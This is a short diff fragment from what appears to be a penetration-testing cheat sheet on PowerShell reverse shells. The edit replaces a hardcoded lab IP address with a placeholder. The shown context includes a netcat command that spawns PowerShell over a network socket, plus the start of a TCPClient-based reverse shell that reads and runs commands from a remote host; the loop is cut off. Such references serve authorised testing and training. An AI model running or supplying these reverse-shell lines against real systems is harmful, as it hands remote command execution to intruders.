@@ -67,7 +67,7 @@ PS > cmd /c C:\Windows\Temp\nc.exe 127.0.0.1 1337 -e powershell
 System.Net.Sockets.TCPClient:
 
 ```shell
-$client = New-Object System.Net.Sockets.TCPClient("10.10.14.234",1337);
+$client = New-Object System.Net.Sockets.TCPClient("<ip-address>",1337);
 $stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};
 while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;
   $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
